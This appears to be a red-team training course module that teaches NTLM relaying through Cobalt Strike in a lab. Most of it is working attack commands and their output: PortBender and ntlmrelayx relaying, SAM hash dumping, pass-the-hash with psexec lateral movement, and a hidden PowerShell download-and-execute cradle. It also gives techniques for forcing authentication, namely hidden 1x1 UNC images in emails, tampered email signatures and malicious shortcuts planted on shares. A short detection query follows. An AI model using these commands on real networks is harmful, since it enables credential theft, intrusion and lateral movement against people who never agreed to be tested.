NTLM authentication uses a 3-way handshake between a client and server.  The high-level steps are as follows:

1.  The client makes an authentication request to a server for a resource it wants to access.
2.  The server sends a challenge to the client - the client needs to encrypt the challenge using the hash of their password.
3.  The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.

In an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.  For instance, a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client.

During an on-premise penetration test, NTLM relaying with tools like [Responder](https://github.com/lgandx/Responder) and [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx) is quite trivial.  However, it's a different story with this style of red team assessment, not least because we can't typically run Python tools on Windows.  Port 445 is always bound and in use by Windows - even local admins can't arbitrarily redirect traffic bound to this port or bind another tool to this port.

It's still possible to do with Cobalt Strike, but requires the use of multiple capabilities simultaneously.

1.  Use a [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2.  Use a reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3.  The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4.  A SOCKS proxy is required to allow ntlmrelayx to send traffic back into the target network.

The flow looks something like this:

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/overview.png)

  

[PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and Aggressor script specifically designed to help facilitate this through Cobalt Strike.  It requires local admin access in order for the driver to be loaded, and that the driver be located in the current working directory of the Beacon.  It makes sense to use `C:\Windows\System32\drivers` since this is where most Windows drivers go.

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> pwd
[*] Current directory is C:\Windows\system32\drivers

beacon> upload C:\Tools\PortBender\WinDivert64.sys
```

  

Next, load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.

```
beacon> help PortBender
Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password
Examples:
	PortBender redirect 445 8445
	PortBender backdoor 443 3389 praetorian.antihacker
```

  

Execute PortBender to redirect traffic from 445 to port 8445.

 > This pretty much breaks any SMB service on the machine.

  

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
```

  

Next, create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).

```
beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445
```

  

We also need the SOCKS proxy so that ntlmrelayx can send responses to the target machine.

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

  

On WKSTN-2, attempt to access WKSTN-1 over SMB.

```
H:\>hostname
wkstn-2

H:\>whoami
dev\nlamb

H:\>dir \\10.10.17.231\blah
```

  

PortBender will log the connection:

```
New connection from 10.10.17.132:50332 to 10.10.17.231:445
Disconnect from 10.10.17.132:50332 to 10.10.17.231:445
```

  

ntlmrelayx will then spring into action.  By default it will use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to dump the local SAM hashes from the target machine.  In this example, I'm relaying from WKSTN-2 to SRV-2.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/dump-sam.png)

  

Local NTLM hashes could then be cracked or used with pass-the-hash.

```
beacon> pth .\Administrator b423cdd3ad21718de4490d9344afef72

beacon> jump psexec64 srv-2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv-2 via Service Control Manager (\\srv-2\ADMIN$\3695e43.exe)
Started service 3695e43 on srv-2
[+] established link to child beacon: 10.10.17.68
```

  

Instead of being limited to dumping NTLM hashes, ntlmrelayx also allows you to execute an arbitrary command against the target.  In this example, I download and execute a PowerShell payload.

```
root@kali:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```

  

After seeing the hit on the web log, connect to the waiting Beacon.

```
07/23 16:28:27 visit (port 80) from: 10.10.5.120
Request: GET /b
page Scripted Web Delivery (powershell)
null

beacon> link srv-2
[*] Tasked to link to \\srv-2\pipe\msagent_a3
[+] host called home, sent: 32 bytes
[+] established link to child beacon: 10.10.17.68
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/chain.png)

  

To stop PortBender, stop the job and kill the spawned process.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  PortBender

beacon> jobkill 0
beacon> kill 1240
```

  

One of the main indicators of this activity is the driver load event for WinDivert.  You can find driver loads in Kibana using Sysmon Event ID 6.  Even though the WinDivert driver has a valid signature, seeing a unique driver load on only one machine is an anomalous event.

```
event.module: sysmon and event.code: 6 and not file.code_signature.subject_name: "Amazon Web Services, Inc."
```

  

As hinted above, the PortBender CNA uses the [bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn) function to spawn a new process and inject the reflective DLL into.  By default, this is rundll32 and will be logged under Sysmon Event ID 1.

 > **EXERCISE**    
Perform the attack above and find the driver load in Kibana.

### Forcing NTLM Authentication

In the real world, it's unlikely you can just jump onto the console of a machine as a privileged user and authenticate to your malicious SMB server.  You can of course just wait for a random event to occur, or try to socially engineer a privileged user.  However, there are also lots of techniques to "force" users to unknowingly trigger NTLM authentication attempts to your endpoint.

Here are a few possibilities.

#### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body.  When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

  

A sneakier means would be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

>  **EXERCISE**  
Send an email from _bfarmer_ to _nlamb_ and view the email in Outlook on WKSTN-2.

#### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon.  Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).

The easiest way to create a shortcut is with PowerShell.

```powershell
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```

  

A good location for these is on publicly readable shares.

 > **EXERCISE**  
  Create a shortcut in the software share and then view it as _nlamb_ on WKSTN-2.
  